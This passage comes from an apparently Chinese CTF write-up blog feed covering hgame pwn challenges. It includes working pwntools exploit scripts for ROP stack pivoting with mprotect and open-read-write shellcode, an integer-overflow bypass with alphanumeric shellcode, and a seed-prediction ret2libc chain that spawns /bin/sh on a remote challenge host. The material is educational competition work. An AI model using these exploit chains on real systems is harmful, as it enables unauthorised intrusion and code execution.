class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以需要栈迁移到<code>buf</code>的起始位置</p><p>总结一下：需要调用<code>mprotect</code>给<code>0x404100</code>权限，所以需要泄露<code>libc</code>调用<code>mprotect</code></p><pre class="line-numbers language-none"><code class="language-none">需要栈迁移到输入的起始位置，所以需要泄露栈地址给&#96;0x404100&#96;权限后向该地址写入&#96;shellcode&#96;实现&#96;orw&#96;再返回到这个地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>写的时候可能有一些细节问题，慢慢调试就好，也可能我写的复杂了</p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">30511</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013e3</span>addr <span class="token operator">=</span> <span class="token number">0x40125B</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'you an accord.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base bss <span class="token operator">=</span> <span class="token number">0x404100</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004013e1</span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__environ'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'you an accord.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1e8</span>leave_ret <span class="token operator">=</span> <span class="token number">0x401290</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_basemprotect <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'you an accord.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> bss <span class="token operator">+</span> <span class="token number">0x300</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> bss <span class="token operator">+</span> <span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>考察的是强制类型转化导致的整型溢出和可见字符<code>shellcode</code></p><p>限制了<code>shellcode</code>长度，输入的变量是<code>unsigned int</code>类型，且限制输入的数字不超过两位，比较的时候会强制转化<code>int</code>类型，输入<code>-1</code>就会先被强制转化成一个很大的整数，而这个数超过了<code>int</code>的最大值，所以比较的时候强制转化之后会变成负数从而绕过长度限制</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  unsigned <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>14h<span class="token punctuation">]</span> BYREF  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  printf<span class="token punctuation">(</span><span class="token string">"input the length of your shellcode:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%2d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v4 <span class="token operator">&lt;=</span> <span class="token number">0xA</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    printf<span class="token punctuation">(</span><span class="token string">"input your shellcode:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    myread<span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>my_read</code>函数中限制了输入内容必须是可见字符，上网搜一下就好了，<a href="https://nuoye-blog.github.io/2020/05/09/dea90f48/#/">https://nuoye-blog.github.io/2020/05/09/dea90f48/#/</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unsigned __int64 __fastcall myread<span class="token punctuation">(</span>void <span class="token operator">*</span>a1<span class="token punctuation">,</span> unsigned <span class="token builtin">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;=</span> <span class="token string">'`'</span> <span class="token operator">|</span><span class="token operator">|</span> v3 <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;=</span> <span class="token string">'@'</span> <span class="token operator">|</span><span class="token operator">|</span> v3 <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;=</span> <span class="token string">'/'</span> <span class="token operator">|</span><span class="token operator">|</span> v3 <span class="token operator">></span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      puts<span class="token punctuation">(</span><span class="token string">"Invalid character\\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v6 <span class="token operator">-</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终主要代码只有两行，exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">31445</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'length of your shellcode:'</span><span class="token punctuation">,</span> <span class="token string">b'-1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your shellcode:'</span><span class="token punctuation">,</span> <span class="token string">b'PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>解出人数倒数第二的题，一开始就直接写这个了，估计大部分人都从前往后写嘛，虽然最后也没抢到一血，这题难倒没什么难点就是一开始报错不存在这个文件给我琢磨了一会</p><p>先检查保护，没有开地址随机化</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">checksec pwn<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2024/hgame/random/pwn'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Partial RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      No PIE <span class="token punctuation">(</span><span class="token number">0x3fe000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前面99次输入随机数，直接c和python联合编程即可，最后执行到<code>myread</code>，可以溢出，<code>ret2libc</code></p><p>题目里存在输入<code>name</code>的本意应该是通过<code>name</code>覆盖<code>seed</code>，但是联合<code>c</code>直接获取时间也很方便</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span> BYREF  char buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Eh<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>12h<span class="token punctuation">]</span> BYREF  <span class="token builtin">int</span> v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>  unsigned <span class="token builtin">int</span> seed<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>  init<span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  seed <span class="token operator">=</span> time<span class="token punctuation">(</span>0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>  puts<span class="token punctuation">(</span><span class="token string">"Menlina: Well tarnished, tell me thy name."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> 0x12uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token string">"I see,%s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">31513</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Menlina: Well tarnished, tell me thy name.'</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span> <span class="token operator">*</span> <span class="token number">0x12</span><span class="token punctuation">)</span> seed <span class="token operator">=</span> <span class="token number">0</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v6 <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Please guess the number:'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>addr <span class="token operator">=</span> <span class="token number">0x40125D</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401423</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401423</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'brilliant mind.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token number">0xe3b01</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="EzSignIn"><a href="#EzSignIn" class="headerlink" title="EzSignIn"></a>EzSignIn</h2><p>直接<code>nc</code>到远程<code>cat flag</code>即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Elden-Ring-I&quot;&gt;&lt;a href=&quot;#Elden-Ring-I&quot; class=&quot;headerlink&quot; title=&quot;Elden Ring I&quot;&gt;&lt;/a&gt;Elden Ring I&lt;/h2&gt;&lt;p&gt;可执行文件直接运行会显示没有这个文件，&lt;code&gt;patch</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>基于已有项目部署网站</title>
    <link href="https://starrysky1004.github.io/2024/01/29/ji-yu-yi-you-xiang-mu-bu-shu-wang-zhan/ji-yu-yi-you-xiang-mu-bu-shu-wang-zhan/"/>
